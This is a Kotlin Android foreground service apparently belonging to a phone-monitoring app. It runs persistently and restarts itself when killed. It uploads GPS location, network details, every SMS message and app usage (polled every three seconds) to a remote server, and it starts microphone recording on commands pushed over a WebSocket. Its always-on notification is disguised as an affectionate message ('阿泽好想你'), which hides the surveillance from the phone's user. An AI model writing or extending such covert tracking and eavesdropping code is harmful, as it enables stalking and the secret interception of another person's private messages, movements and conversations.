package com.venue.monitor.service

import android.app.Notification
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.venue.monitor.MainActivity
import com.venue.monitor.MonitorApplication
import com.venue.monitor.MonitorState
import com.venue.monitor.R
import com.venue.monitor.api.ApiClient
import com.venue.monitor.api.DeviceCredentialsBody
import com.venue.monitor.api.MonitorReportRequest
import com.venue.monitor.data.AppUsageItem
import com.venue.monitor.data.AppUsageReportRequest
import com.venue.monitor.data.PendingUploadStore
import com.venue.monitor.data.PrefsManager
import com.venue.monitor.device.AppUsageProvider
import com.venue.monitor.device.DeviceStatusProvider
import com.venue.monitor.device.SmsProvider
import com.venue.monitor.location.LocationProvider
import com.venue.monitor.net.DeviceWsClient
import com.venue.monitor.data.SmsReportRequest
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * 系统前台服务 - 持续运行，定时（默认每 10 分钟）采集位置/电量/网络并上报
 * 同时注册广播监听电量与网络的实时变化（仅更新本地缓存，不立即上报）
 *
 * 额外职责：
 * - 维护设备端 WebSocket 长连接（DeviceWsClient），接收管理端下发的 audio_control 指令
 * - 将 audio_control 指令派发给 AudioRecorderService
 */
class MonitorForegroundService : LifecycleService() {

    private lateinit var locationProvider: LocationProvider
    private lateinit var deviceProvider: DeviceStatusProvider
    private lateinit var appUsageProvider: AppUsageProvider
    private var wsClient: DeviceWsClient? = null

    /** 上一次检测到的前台应用包名 - 用于检测切换事件 */
    @Volatile private var lastForegroundPkg: String? = null

    /** 实时缓存的电量信息（由广播更新） */
    @Volatile private var cachedBattery: DeviceStatusProvider.BatteryInfo? = null
    /** 实时缓存的网络信息（由广播更新） */
    @Volatile private var cachedNetwork: DeviceStatusProvider.NetworkInfo? = null

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            updateBatteryInfo()
        }
    }

    private val networkReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            updateNetworkInfo()
        }
    }

    override fun onCreate() {
        super.onCreate()
        locationProvider = LocationProvider(this)
        deviceProvider = DeviceStatusProvider(this)
        appUsageProvider = AppUsageProvider(this)

        // 初始化缓存
        updateBatteryInfo()
        updateNetworkInfo()
        // 预取一次位置填充缓存，后续定时采集基本都走秒回路径
        locationProvider.prefetchWarmUp()

        // 注册广播监听电量与网络变化
        registerReceiver(batteryReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_CHANGED)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
        })
        registerReceiver(networkReceiver, IntentFilter().apply {
            addAction("android.net.conn.CONNECTIVITY_CHANGE")
            addAction("android.net.wifi.STATE_CHANGE")
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, buildNotification("想你了~"))
        MonitorState.setServiceRunning(true)

        // 启动定时采集协程
        lifecycleScope.launch(Dispatchers.IO) {
            // 启动时立即采集一次
            collectAndUpload()
            // 之后按固定间隔循环：每次循环都重新读配置，确保修改立即生效
            while (true) {
                val interval = MonitorApplication.prefs.intervalMillis
                delay(interval)
                collectAndUpload()
            }
        }

        // 启动前台应用切换监听 - 每 3 秒检测一次，前台变化时立即上报
        lifecycleScope.launch(Dispatchers.IO) {
            startForegroundAppWatcher()
        }

        // 启动设备端 WebSocket 长连接
        startWsClient()

        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onDestroy() {
        try { unregisterReceiver(batteryReceiver) } catch (e: Exception) {}
        try { unregisterReceiver(networkReceiver) } catch (e: Exception) {}
        // 停止 WS 长连接
        stopWsClient()
        // 兜底：若录音仍在进行，停止录音
        try { AudioRecorderService.stop(this) } catch (e: Exception) {}
        MonitorState.setServiceRunning(false)
        // 通知服务器设备下线
        notifyOffline()
        // 若服务是被系统杀死（而非用户主动停止），则尝试自重启
        if (MonitorApplication.prefs.serviceEnabled) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    val intent = Intent(this, MonitorForegroundService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                } catch (e: Exception) { /* 忽略重启失败 */ }
            }, 1000)
        }
        super.onDestroy()
    }

    private fun updateBatteryInfo() {
        val info = deviceProvider.getBatteryInfo()
        cachedBattery = info
        MonitorState.setBattery(info.level, info.charging)
    }

    private fun updateNetworkInfo() {
        val info = deviceProvider.getNetworkInfo()
        cachedNetwork = info
        MonitorState.setNetworkType(info.type)
    }

    /** 启动设备端 WS 客户端，接收 audio_control 指令 */
    private fun startWsClient() {
        if (wsClient != null) return
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) return
        val client = DeviceWsClient(prefs, object : DeviceWsClient.Listener {
            override fun onAudioControl(action: String, sessionId: String?, reason: String?) {
                Log.i(TAG, "audio_control: action=$action sid=$sessionId reason=$reason")
                when (action) {
                    "start" -> {
                        val sid = sessionId ?: "aud-${System.currentTimeMillis()}"
                        try {
                            AudioRecorderService.start(this@MonitorForegroundService, sid)
                        } catch (e: Throwable) {
                            Log.e(TAG, "start AudioRecorderService failed: ${e.message}", e)
                        }
                    }
                    "stop" -> {
                        try {
                            AudioRecorderService.stop(this@MonitorForegroundService)
                        } catch (e: Throwable) {
                            Log.e(TAG, "stop AudioRecorderService failed: ${e.message}", e)
                        }
                    }
                }
            }

            override fun onConnected() {
                Log.i(TAG, "设备 WS 已连接")
                MonitorState.setWsConnected(true)
            }

            override fun onDisconnected(reason: String) {
                Log.w(TAG, "设备 WS 断开：$reason")
                MonitorState.setWsConnected(false)
            }
        })
        client.start()
        wsClient = client
        MonitorApplication.wsClient = client
    }

    private fun stopWsClient() {
        try { wsClient?.stop() } catch (_: Throwable) {}
        wsClient = null
        MonitorApplication.wsClient = null
        MonitorState.setWsConnected(false)
    }

    /** 核心方法：采集位置+电量+网络+短信，一次性入队后逐条上传（含失败重试） */
    private suspend fun collectAndUpload() {
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) {
            MonitorState.setLastReport("设备未激活，跳过上报")
            return
        }

        val recordedAt = nowIso8601()
        MonitorState.setLastReport("正在采集...")

        // 2. 电量、3. 先拿电量+网络（这两个同步，毫秒级）
        val battery = cachedBattery ?: deviceProvider.getBatteryInfo()
        val network = cachedNetwork ?: deviceProvider.getNetworkInfo()

        // 1. 位置最慢，加最大 5 秒内拿不到位置就直接上报空位置（电量/网络照样有数据不能因位置阻塞上报）
        val location: Location? = try {
            withTimeout(LOCATION_TIMEOUT_MS) {
                withContext(Dispatchers.IO) {
                    locationProvider.getLastLocation()
                }
            }
        } catch (_: Throwable) {
            null
        }

        // 4. 采集当前使用的软件（前台应用 + 最近使用列表）- 复用 provider 实例
        val usage = appUsageProvider.getUsageInfo()
        // 同步采集一次完整应用快照并入队（与 monitor 同周期上报，确保管理端有完整数据）
        val appSnapshot = appUsageProvider.getSnapshot()

        // 5. 组装监控请求
        val request = MonitorReportRequest(
            deviceCode = prefs.deviceCode,
            deviceToken = prefs.deviceToken,
            latitude = location?.latitude,
            longitude = location?.longitude,
            accuracy = location?.accuracy?.toDouble(),
            altitude = location?.altitude,
            speed = location?.speed?.toDouble(),
            batteryLevel = battery.level,
            batteryCharging = battery.charging,
            batteryTemperature = battery.temperature.toDouble(),
            networkType = network.type,
            networkStrength = network.strength,
            wifiSsid = network.ssid,
            ipAddress = network.ipAddress,
            foregroundApp = usage.foregroundApp,
            recentApps = usage.recentApps,
            extra = mapOf(
                "battery_tech" to battery.technology,
                "location_provider" to (location?.provider ?: "unknown")
            ),
            recordedAt = recordedAt
        )

        // 6. 一次性入队：监控数据 + 应用快照 + 短信（断点续传 - 即使 App 中途死亡，下次仍能上传）
        val gson = Gson()
        val pendingStore = PendingUploadStore(this)
        pendingStore.enqueue("monitor", gson.toJson(request))
        // 同步入队一次完整应用快照（含前台+后台应用），事件类型 snapshot
        enqueueAppUsage(appSnapshot, "snapshot")
        // 更新前台包名缓存，避免 watcher 立即重复上报
        lastForegroundPkg = appSnapshot.foreground?.packageName

        // 7. 采集并入队短信（首次全量/后续增量）
        enqueueSmsIfAny(pendingStore, gson)

        // 8. drain 队列：逐条上传，成功的移除，失败的保留并增加重试计数
        val drainResult = drainPendingQueue(pendingStore, gson)

        // 9. 更新 UI 状态
        val total = drainResult.first
        val succeeded = drainResult.second
        if (succeeded > 0) {
            prefs.lastUploadTime = System.currentTimeMillis()
            MonitorState.setUploadResult(true, prefs.lastUploadTime)
            MonitorState.setLastReport(
                "上报成功 ${formatTime(prefs.lastUploadTime)} " +
                    "| 电量${battery.level}% ${if (battery.charging) "充电中" else "未充电"} " +
                    "| ${network.type} " +
                    "| 位置${formatLocation(location)}" +
                    (if (total > 1) " | 本批 $succeeded/$total" else "")
            )
            updateNotification("想你了~ 上次 ${formatTime(prefs.lastUploadTime)}")
        } else if (total > 0) {
            // 全部失败
            MonitorState.setUploadResult(false, System.currentTimeMillis())
            MonitorState.setLastReport("上报失败：$succeeded/$total 成功，待下次重试")
            updateNotification("想你了~ 等你回应")
        }
    }

    /** 采集短信并入队（不阻塞主流程，失败静默下次重试） */
    private fun enqueueSmsIfAny(store: PendingUploadStore, gson: Gson) {
        try {
            val prefs = MonitorApplication.prefs
            val smsProvider = SmsProvider(this)
            if (!smsProvider.hasPermission()) return

            val (items, syncType) = if (!prefs.smsFullSynced) {
                Pair(smsProvider.readAllSms(limit = 500), "full")
            } else {
                Pair(
                    smsProvider.readAllSms(
                        limit = null,
                        sinceSmsId = if (prefs.lastSmsSyncId > 0) prefs.lastSmsSyncId else null
                    ),
                    "incremental"
                )
            }

            if (items.isNotEmpty()) {
                val smsReq = SmsReportRequest(
                    deviceCode = prefs.deviceCode,
                    deviceToken = prefs.deviceToken,
                    items = items,
                    syncType = syncType,
                    reportedAt = nowIso8601()
                )
                store.enqueue("sms", gson.toJson(smsReq))
                // 提前更新本地游标：即便上传失败，下次也不会重复采集这些短信
                // （失败时由队列自身重试，不依赖 cursor）
                val maxId = items.maxOfOrNull { it.smsId } ?: 0L
                if (maxId > prefs.lastSmsSyncId) prefs.lastSmsSyncId = maxId
                if (!prefs.smsFullSynced) prefs.smsFullSynced = true
            }
        } catch (e: Throwable) {
            Log.w(TAG, "短信采集失败: ${e.message}")
        }
    }

    /**
     * 逐条上传队列中的待上传条目，实现断点续传与失败重试
     * @return Pair(总数, 成功数)
     */
    private suspend fun drainPendingQueue(
        store: PendingUploadStore,
        gson: Gson
    ): Pair<Int, Int> {
        val entries = store.peekAll()
        if (entries.isEmpty()) return Pair(0, 0)

        var succeeded = 0
        ApiClient.rebuild()
        val api = try {
            ApiClient.get()
        } catch (e: Exception) {
            Log.w(TAG, "ApiClient 未就绪，跳过 drain: ${e.message}")
            return Pair(entries.size, 0)
        }

        for (entry in entries) {
            try {
                val ok = when (entry.type) {
                    "monitor" -> {
                        val req = gson.fromJson(entry.payload, MonitorReportRequest::class.java)
                        api.report(req).ok
                    }
                    "sms" -> {
                        val req = gson.fromJson(entry.payload, SmsReportRequest::class.java)
                        api.reportSms(req).ok
                    }
                    "app_usage" -> {
                        val req = gson.fromJson(entry.payload, AppUsageReportRequest::class.java)
                        api.reportAppUsage(req).ok
                    }
                    else -> {
                        // 未知类型直接移除
                        true
                    }
                }
                if (ok) {
                    store.remove(entry.id)
                    succeeded++
                    Log.i(TAG, "drain 成功: type=${entry.type} id=${entry.id}")
                } else {
                    store.markFailed(entry.id)
                    Log.w(TAG, "drain 服务器返回失败: type=${entry.type}")
                }
            } catch (e: Exception) {
                store.markFailed(entry.id)
                Log.w(TAG, "drain 异常 type=${entry.type}: ${e.message}")
                // 网络异常时停止后续条目（避免短时间内大量失败）
                break
            }
        }

        return Pair(entries.size, succeeded)
    }

    /**
     * 前台应用切换监听器 - 每 [FOREGROUND_POLL_INTERVAL_MS] 检测一次当前前台应用
     *
     * 检测到前台应用变化时立即采集应用快照并入队（事件类型 foreground_change），
     * 随后立即触发 drain 上传，实现近实时上报（典型延迟 < 3 秒）。
     *
     * 同一前台应用持续运行时，每 [SNAPSHOT_INTERVAL_MS] 上报一次完整快照（含后台应用列表），
     * 用于让管理端持续看到后台应用状态。
     */
    private suspend fun startForegroundAppWatcher() {
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) return
        // 无使用情况权限则放弃监听（避免无效轮询）
        if (!appUsageProvider.hasUsageAccess()) {
            Log.w(TAG, "未授予使用情况访问权限，跳过应用切换监听")
            return
        }

        var lastSnapshotTime = 0L
        // 等待首次 collectAndUpload 完成后再启动监听，避免抢资源
        delay(FOREGROUND_POLL_INTERVAL_MS)

        while (true) {
            try {
                val snapshot = appUsageProvider.getSnapshot()
                val currentFg = snapshot.foreground?.packageName
                val now = System.currentTimeMillis()

                val fgChanged = currentFg != lastForegroundPkg
                val needSnapshot = (now - lastSnapshotTime) >= SNAPSHOT_INTERVAL_MS

                if (fgChanged || needSnapshot) {
                    val eventType = if (fgChanged) "foreground_change" else "snapshot"
                    enqueueAppUsage(snapshot, eventType)
                    // 立即 drain 上传，实现近实时
                    val store = PendingUploadStore(this)
                    val gson = Gson()
                    drainPendingQueue(store, gson)
                    lastForegroundPkg = currentFg
                    if (needSnapshot) lastSnapshotTime = now
                    if (fgChanged) {
                        Log.i(TAG, "前台切换 -> ${snapshot.foreground?.appLabel ?: currentFg} ($currentFg)")
                    }
                }
            } catch (e: Throwable) {
                Log.w(TAG, "应用监听异常: ${e.message}")
            }
            delay(FOREGROUND_POLL_INTERVAL_MS)
        }
    }

    /** 将应用快照转换为上报请求并入队 */
    private fun enqueueAppUsage(
        snapshot: AppUsageProvider.UsageSnapshot,
        eventType: String
    ) {
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) return
        if (snapshot.all.isEmpty()) return

        val items = snapshot.all.map { info ->
            AppUsageItem(
                packageName = info.packageName,
                appLabel = info.appLabel,
                versionName = info.versionName,
                isForeground = info.isForeground,
                lastUsedAt = info.lastUsedAt,
                totalTimeVisible = info.totalTimeVisible
            )
        }
        val req = AppUsageReportRequest(
            deviceCode = prefs.deviceCode,
            deviceToken = prefs.deviceToken,
            eventType = eventType,
            recordedAt = nowIso8601(),
            apps = items
        )
        val gson = Gson()
        val store = PendingUploadStore(this)
        store.enqueue("app_usage", gson.toJson(req))
    }

    private fun notifyOffline() {
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) return
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                ApiClient.get().offline(DeviceCredentialsBody(prefs.deviceCode, prefs.deviceToken))
            } catch (e: Exception) { /* 忽略 */ }
        }
    }

    private fun buildNotification(text: String): Notification {
        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        else PendingIntent.FLAG_UPDATE_CURRENT

        val openIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java), pendingFlags
        )

        return NotificationCompat.Builder(this, MonitorApplication.CHANNEL_SERVICE)
            .setContentTitle("阿泽好想你")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(openIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
        nm.notify(NOTIFICATION_ID, buildNotification(text))
    }

    companion object {
        private const val TAG = "MonitorFgService"
        const val NOTIFICATION_ID = 1001
        /** 位置采集最大等待时长（毫秒），超时就上报空位置，避免卡住整个上报流程 */
        private const val LOCATION_TIMEOUT_MS = 5000L
        /** 前台应用切换检测间隔（毫秒），3 秒一次以实现近实时上报 */
        private const val FOREGROUND_POLL_INTERVAL_MS = 3000L
        /** 同一前台应用持续运行时，定期上报完整快照（含后台应用）的间隔 */
        private const val SNAPSHOT_INTERVAL_MS = 60_000L

        fun start(context: Context) {
            val intent = Intent(context, MonitorForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, MonitorForegroundService::class.java))
        }

        private fun nowIso8601(): String {
            val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
            sdf.timeZone = TimeZone.getTimeZone("UTC")
            return sdf.format(Date())
        }

        private fun formatTime(millis: Long): String {
            val sdf = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
            return sdf.format(Date(millis))
        }

        private fun formatLocation(loc: Location?): String {
            if (loc == null) return "无"
            return String.format(Locale.US, "%.5f,%.5f", loc.latitude, loc.longitude)
        }
    }
}
